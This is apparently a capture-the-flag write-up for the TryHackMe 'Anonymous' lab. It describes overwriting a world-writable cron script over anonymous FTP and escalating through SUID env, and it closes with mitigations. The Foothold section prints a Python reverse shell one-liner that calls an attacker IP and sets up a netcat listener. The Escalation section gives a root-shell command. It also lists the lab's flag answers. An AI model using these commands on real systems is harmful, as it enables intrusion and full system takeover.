```
  █████╗ ███╗   ██╗ ██████╗ ███╗   ██╗██╗   ██╗███╗   ███╗ ██████╗ ██╗   ██╗███████╗
 ██╔══██╗████╗  ██║██╔═══██╗████╗  ██║╚██╗ ██╔╝████╗ ████║██╔═══██╗██║   ██║██╔════╝
 ███████║██╔██╗ ██║██║   ██║██╔██╗ ██║ ╚████╔╝ ██╔████╔██║██║   ██║██║   ██║███████╗
 ██╔══██║██║╚██╗██║██║   ██║██║╚██╗██║  ╚██╔╝  ██║╚██╔╝██║██║   ██║██║   ██║╚════██║
 ██║  ██║██║ ╚████║╚██████╔╝██║ ╚████║   ██║   ██║ ╚═╝ ██║╚██████╔╝╚██████╔╝███████║
 ╚═╝  ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚═╝     ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝
              TryHackMe: Anonymous
```

> 👤 **Author:** farhan | 📅 **Date:** 2026-06-24 | 🏠 **Platform:** TryHackMe | 💀 **Difficulty:** Easy | ⭐ **Rating:** ⭐⭐☆☆☆

> ⏱️ ~10 min read

---

## Table of Contents

- [Progress Checklist](#progress-checklist)
- [Tools Used](#️-tools-used)
- [TL;DR](#-tldr)
- [Introduction](#-introduction)
- [Recon](#-recon)
- [Foothold](#-foothold)
- [Shell / Access](#-shell--access)
- [Escalation](#-escalation)
- [Exploitation](#-exploitation)
- [Rabbit Holes](#-rabbit-holes)
- [Flag](#-flag)
- [Mitigations](#️-mitigations)
- [Key Takeaway](#-key-takeaway)
- [If I Did It Again](#-if-i-did-it-again)
- [Changelog](#-changelog)

---

## Progress Checklist

- [x] Port scan: FTP (21), SSH (22), SMB (139/445)
- [x] Anonymous FTP login: found world-writable `scripts/` directory
- [x] Retrieved `clean.sh`, `removed_files.log`, `to_do.txt`
- [x] Identified `clean.sh` as a periodically-executed cleanup script
- [x] `to_do.txt` confirmed anonymous login was a known, unaddressed risk
- [x] Overwrote `clean.sh` via FTP with a Python reverse shell payload
- [x] Waited for scheduled execution: caught shell as `namelessone`
- [x] Retrieved user flag
- [x] SUID enumeration → `/usr/bin/env`
- [x] `env /bin/sh -p` → root shell
- [x] Retrieved root flag
- [x] `smbclient -L` to identify the SMB share name (`pics`) for the room's quiz question

---

## 🛠️ Tools Used

- 🔎 RustScan + Nmap: port scanning and service detection
- 📂 FTP client: anonymous login, file retrieval, and script overwrite
- 🐍 Python reverse shell one-liner: payload embedded in the writable script
- 🐚 Netcat: reverse shell listener
- 🗂️ smbclient: SMB share enumeration

---

## ⚡ TL;DR

A world-writable FTP `scripts/` directory contained a cleanup script that runs on a schedule, plus a to-do note literally saying "I really need to disable the anonymous login." The cleanup script was overwritten via FTP with a Python reverse shell payload; the next scheduled run executed it, landing a shell as `namelessone`. SUID `/usr/bin/env` finished the job: a one-line GTFOBins escape to root.

---

## 📖 Introduction

Today's target is **Anonymous**: a box that puts its own postmortem in writing before the engagement even starts. The `to_do.txt` file sitting in the FTP share is the sysadmin's own unaddressed risk assessment: anonymous FTP login is dangerous and needs disabling. It never got disabled. The writable `scripts/` directory paired with a periodically-executed cleanup script is a textbook "writable file in a privileged execution chain" vulnerability, very similar in spirit to the Startup box earlier in this series: except here the scheduling mechanism doesn't even need to be inferred, since the box explicitly shows the log file growing in real time between FTP checks.

### Prerequisites

Readers are assumed to know:

- What anonymous FTP write access enables when paired with a periodically-executed script
- How `nano` or any text editor can be used to overwrite a script's contents while preserving its execution context
- What SUID `env` allows via GTFOBins (`env <interpreter> <flags>`)
- Basic `smbclient` usage for SMB share enumeration

---

## 🔍 Recon

*(~0 mins into the box)*

### Port Scan

```bash
rustscan -a 10.48.171.146 -r 1-65535 --ulimit 5000 -b 500 -t 2000 -- -Pn -sV -sC -T4
```

| Port | Service | Version |
| --- | --- | --- |
| 21/tcp | FTP | vsftpd 3.0.3: anonymous allowed; `scripts/` flagged **writable** by Nmap |
| 22/tcp | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 139/tcp, 445/tcp | SMB | Samba smbd 4.7.6-Ubuntu |

Nmap's `ftp-anon` script doesn't just confirm anonymous access: same as the Startup box: it flags the `scripts` subdirectory specifically as `[NSE: writeable]`. That detail alone defines the entire attack path before a single manual command is run.

### Anonymous FTP

The FTP banner itself is a nice touch: *"NamelessOne's FTP Server!"*: directly naming the box's eventual user account before any enumeration even begins.

```bash
ftp 10.48.171.146
# Name: anonymous
ftp> cd scripts
ftp> ls
```

```
-rwxr-xrwx  clean.sh
-rw-rw-r--  removed_files.log
-rw-r--r--  to_do.txt
```

*Downloading all three:*

```bash
ftp> get clean.sh
ftp> get removed_files.log
ftp> get to_do.txt
```

*`clean.sh` contents:*

```bash
#!/bin/bash
tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    echo "Running cleanup script: nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log
    done
fi
```

A cleanup script intended to delete temp files and log the activity: currently a no-op since `tmp_files` is hardcoded to `0`. The interesting part isn't the script's logic; it's that `removed_files.log` already contains over twenty identical "nothing to delete" entries: direct proof this script runs automatically and repeatedly, almost certainly via cron.

*`to_do.txt` contents:*

```
I really need to disable the anonymous login...it's really not safe
```

The sysadmin's own words confirming the exact vulnerability being exploited.

---

## 🚪 Foothold

*(~10 mins into the box)*

### Writable Script Overwrite

**Why does this work?** `clean.sh` is owned by a local user (uid 1000) but has world-write permission (`-rwxr-xrwx`), and it's confirmed to execute repeatedly via the growing log file. Since the script lives in an anonymously-writable FTP directory, overwriting its contents with arbitrary shell/Python code means that code runs under the script's owning account the next time the scheduler fires it: no exploit needed beyond an FTP `PUT`.

*Connecting and editing the script directly through the FTP-mounted path with `nano` (the file having been pulled locally for editing then re-uploaded, or edited via an FTP-aware editor):*

```bash
nano clean.sh
```

*Replacing the script body with a Python reverse shell one-liner:*

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.134.217",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

*Re-uploading the modified script via FTP, then setting up the listener and waiting for the next scheduled execution:*

```bash
nc -nvlp 4444
```

```
connect to [192.168.134.217] from (UNKNOWN) [10.48.171.146] 36554
```

*Stabilising:*

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

```
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

---

## 🐚 Shell / Access

Landed directly as `namelessone`: the named user the FTP banner all but introduced by name. No intermediate `www-data` hop was needed since the script executes under this user's own account via cron.

---

## 📈 Escalation

*(~15 mins into the box)*

### SUID env: GTFOBins

```bash
find / -perm -u=s -type f 2>/dev/null
```

```
/usr/bin/env
```

Among the standard system SUID binaries, `/usr/bin/env` stands out.

**Why is SUID `env` dangerous?** `env` is designed to run a program in a modified environment, but it executes that program directly, inheriting whatever privileges the `env` binary itself has. With the SUID bit set, `env` runs with the file owner's privileges (root), and any program it launches inherits that same elevated privilege level.

*One command to root:*

```bash
/usr/bin/env /bin/sh -p
```

```
# id
uid=1000(namelessone) gid=1000(namelessone) euid=0(root) groups=...,27(sudo),...
# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
```

---

## 💥 Exploitation

The complete attack chain:

1. **Anonymous FTP** with a writable `scripts/` directory and a script confirmed to run on a schedule
2. **Overwrote `clean.sh`** with a Python reverse shell payload via FTP
3. **Waited for the scheduled execution** → shell as `namelessone` → user flag
4. **SUID `env`** → `env /bin/sh -p` → root shell → root flag

---

## 🐇 Rabbit Holes

### SMB Share Enumeration (For the Quiz Question, Not the Exploit Path)

The room's accompanying questions required identifying the SMB share name: a step entirely separate from the actual exploitation chain. `smbclient -L` against the host with a null session:

```bash
smbclient -L //10.48.171.146/ -N
```

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
pics            Disk      My SMB Share Directory for Pics
IPC$            IPC       IPC Service
```

The `pics` share matches the `pics` directory later seen in `namelessone`'s home directory: confirming SMB and the local filesystem share the same content, though this connection wasn't load-bearing for the actual privilege escalation path.

---

## 🏁 Flag

| Flag | Value | Location |
| --- | --- | --- |
| User | `90d6f992585815ff991e68748c414740` | `/home/namelessone/user.txt` |
| Root | `4d930091c31a622a7ed10f27999af363` | `/root/root.txt` |

---

## 🛡️ Mitigations

| Vulnerability | Severity | Mitigation |
| --- | --- | --- |
| Anonymous FTP login enabled | Critical | Disable anonymous FTP entirely: the box's own `to_do.txt` correctly identifies this as the root issue |
| World-writable script in a scheduled execution chain | Critical | Scripts executed by cron or any scheduler must be owned by root (or the minimum necessary user) with no group/world write access (`chmod 700`) |
| SUID bit set on `/usr/bin/env` | Critical | Remove the SUID bit from `env`: it has no legitimate administrative need for it; cross-reference all SUID binaries against GTFOBins |
| SMB shares accessible via null session | Medium | Restrict guest/anonymous SMB access; require authentication for all shares |

---

## 💡 Key Takeaway

> 💡 **Takeaway:** A growing log file with repeated identical entries is direct evidence of a scheduled task, and a writable script anywhere in that execution chain is a privilege escalation path regardless of whether `sudo -l` or SUID enumeration shows anything interesting at all. Always check what owns and triggers a script before assuming a quiet `sudo -l` output means there's no path forward.

---

## 🔁 If I Did It Again

Check `removed_files.log`'s timestamp pattern immediately to estimate the cron interval before uploading the payload: knowing roughly how long the wait will be (rather than discovering it passively) makes the difference between confidently waiting and repeatedly second-guessing whether the upload worked.

---

## 🔚 Changelog

*Last updated: 2026-06-24*

---

[↑ Back to top](#)
